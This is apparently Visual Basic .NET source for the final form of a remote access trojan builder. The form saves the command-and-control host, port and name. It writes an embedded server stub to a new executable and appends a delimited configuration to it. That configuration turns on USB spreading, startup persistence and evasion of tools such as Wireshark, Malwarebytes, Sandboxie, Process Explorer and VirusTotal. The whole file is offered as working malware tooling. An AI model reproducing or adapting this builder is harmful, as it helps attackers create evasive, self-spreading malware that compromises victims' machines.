Imports System.IO
Public Class Finish_Form
    Dim x, y As Integer
    Dim loc As Object
    Dim xx As Integer
    Dim yy As Integer
    Dim loc2 As Object
    Dim locc As Object
    Dim stub, text1, text2, text3 As String
    Const spl As String = "abccba"
    Dim ex As Exception
    Dim s As New SaveFileDialog
    Sub SaveControl()
        My.Settings.Reload()

        My.Settings.Host = builder_host.TextBox1.Text
        My.Settings.Port = builder_host.TextBox2.Text
        My.Settings.Name = builder_host.TextBox4.Text
        My.Settings.Save()
    End Sub
    Private Sub ReloadControl()
        builder_host.TextBox1.Text = My.Settings.Host
        builder_host.TextBox2.Text = My.Settings.Port
        builder_host.TextBox4.Text = My.Settings.Name

    End Sub
  
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If Not yy <= Builder.Panel2.Height - (Builder_Options_.Height - (Builder_Options_.startup.Location.Y * 1.25)) Then
            yy -= 50
            Me.Location = New Point(locc, yy)
        Else
            Timer1.Stop()
            ReloadControl()
            'Final Stop
        End If
    End Sub


    Private Sub Finish_Form_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.TopLevel = False


        '   Me.Label1.Text = My.Settings.Username
        ' xx = Builder.Panel2.Width
        yy = Builder.Panel2.Height
        'x = Screen.PrimaryScreen.WorkingArea.Width - Me.Width
        'y = Screen.PrimaryScreen.WorkingArea.Height


        '  locc = Builder.Panel2.Location.X + builder_host.Width

        locc = Builder_Anti.Width

        ' loc = Screen.PrimaryScreen.WorkingArea.Location.X
        ' loc2 = Screen.PrimaryScreen.WorkingArea.Location.Y



        Me.Location = New Point(locc, yy)
        Me.TopMost = True
        Timer1.Start()
    End Sub

    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        start_withcam()
    End Sub
    Sub start_withcam()
        If builder_host.TextBox1.Text & builder_host.TextBox2.Text & builder_host.TextBox4.Text = "" Then
            MsgBox("Complete Information Please At least Host & Port & Name ", MsgBoxStyle.Critical, "Create Server")
        Else

            s.ShowDialog()
            If s.FileName > "" Then
                text1 = builder_host.TextBox1.Text
                text2 = builder_host.TextBox2.Text
                text3 = builder_host.TextBox4.Text
                Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"

                File.WriteAllBytes(temp, My.Resources.Server_New_)
                ' File.WriteAllBytes(temp, My.Resources.Server_nodll_)
                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2 & spl & text3 & spl & Builder_Anti.CheckBox1.Checked & spl & Builder_Options_.usb.Checked & spl & Builder_Options_.startup.Checked & spl & Builder_Anti.processexplorer.Checked & spl & Builder_Anti.sandboxie.Checked & spl & Builder_Anti.spythespy.Checked & spl & Builder_Anti.speadgear.Checked & spl & Builder_Anti.wireshark.Checked & spl & Builder_Anti.malwarebytes.Checked & spl & Builder_Anti.apatedns.Checked & spl & Builder_Anti.ipblocker.Checked & spl & Builder_Anti.cports.Checked & spl & Builder_Anti.processhacker.Checked & spl & Builder_Anti.antikeylogger.Checked & spl & Builder_Anti.keyscramber.Checked & spl & Builder_Anti.cmd.Checked & spl & Builder_Anti.virustotal.Checked & spl & Builder_Anti.drivecut.Checked)
                FileClose(1)
                ListBox1.Items.Clear()
                ListBox1.Items.Add("Host : " & text1)
                ListBox1.Items.Add("Port : " & text2)
                ListBox1.Items.Add("Name : " & text3)

                ListBox1.Items.Add("Anti Online Scanner : " & Builder_Anti.virustotal.Checked)
                ListBox1.Items.Add("Server Build In : " & s.FileName)
            Else
                ListBox1.Items.Add(ex)
            End If
        End If
    End Sub
End Class